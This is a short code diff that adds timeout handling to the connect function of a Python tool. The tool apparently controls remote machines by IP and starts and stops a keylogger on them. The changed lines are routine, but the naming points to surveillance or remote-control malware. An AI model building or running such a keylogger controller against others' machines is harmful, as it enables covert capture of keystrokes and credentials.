@@ -64,7 +64,10 @@ def connect(ip: str) -> str:
     if ip in ovils:
         return "You've already connected to this ovil"
     ovil = Client(ip)
-    ovil.connect_to_server()
+    try:
+        ovil.connect_to_server()
+    except TimeoutError:
+        return "This ovil didn't responded. You should try other ip"
     ovils.append(ovil)
     return "Connected successfully!"
 
@@ -208,7 +211,6 @@ def stop_keyLogger(ip):
     elif result == Massages.NOT_OK.value:
         return "Couldn't stop the KeyLogger!"
     return result
-
 
 
 def main():
